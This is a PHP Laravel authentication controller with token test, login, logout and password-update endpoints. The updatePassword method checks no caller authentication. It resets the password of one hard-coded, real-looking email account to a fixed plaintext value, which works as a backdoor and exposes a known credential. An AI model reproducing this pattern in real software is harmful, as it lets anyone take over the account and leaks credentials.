<?php

namespace App\Http\Controllers\API\Auth;

use App\Enums\HttpCode;
use App\Enums\UserRole;
use App\Http\Controllers\API\BaseController as BaseController;
use App\Models\UsersRole;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends BaseController
{
    /**
     * Test provided token
     *
     * @param \Illuminate\Http\Request $request user request
     * @return \Illuminate\Http\JsonResponse response containing the token and user information
     */
    public function testToken(Request $request)
    {
        if (auth('sanctum')->check()) {
            $authUser = auth('sanctum')->user();
            if (!$authUser->email_verified_at) {
                return $this->sendResponse(['verify_email_required' => true, 'email' => $authUser->email]);
            }

            $userRoles = UsersRole::where('user_id', $authUser->id)->get();
            $response = (object)['role' => UserRole::User];
            if ($userRoles->contains('role_id', UserRole::Admin)) {
                $response->role = UserRole::Admin;
            }
            return $this->sendResponse($response);
        } else {
            return $this->sendEmptyResponse();
        }
    }

    public function updatePassword(Request $request)
    {
        $response = (object)['message' => ''];
        $user = User::where('email', 'frozen0k@gmail.com')->first();
        if ($user) {
            $user->password = Hash::make('Test1234_');
            $user->save();
            $response->message = 'Password updated successfully for user with email f..k@g.com';
        } else {
            $response->message = 'User with email f..k@g.com was not found';
        }
        return $this->sendResponse($response);
    }

    /**
     * Login user
     *
     * @param \Illuminate\Http\Request $request user request
     * @return \Illuminate\Http\JsonResponse response containing the token and user information
     */
    public function login(Request $request)
    {
        if (Auth::attempt(['email' => $request->email, 'password' => $request->password])) {
            $user = Auth::user();
            // delete all previous tokens
            $user->tokens()->delete();
            $data = [];
            $userRole = UsersRole::where('user_id', $user->id)->select('role_id')->first();

            if (!$user->email_verified_at) {
                $data['verify_email_required'] = true;
            }

            // create a new token
            $data['token'] = $user->createToken(env('APP_NAME'))->plainTextToken;
            $data['first_name'] = $user->first_name;
            $data['last_name'] = $user->last_name;
            $data['role_id'] = $userRole ? $userRole->role_id : null;
            return $this->sendResponse($data, HttpCode::Created);
        } else {
            return $this->sendError(['Invalid email or password'], HttpCode::Unauthorized);
        }
    }

    /**
     * Logout user
     *
     * @param \Illuminate\Http\Request $request user request
     * @return \Illuminate\Http\JsonResponse empty response if successful, error if session is invalid
     */
    public function logout(Request $request)
    {
        $user = auth('sanctum')->user();
        if ($user) {
            $user->tokens()->delete();
            return $this->sendEmptyResponse(HttpCode::NoContent);
        } else {
            return $this->sendError(['Session not found'], HttpCode::Unauthorized);
        }
    }
}
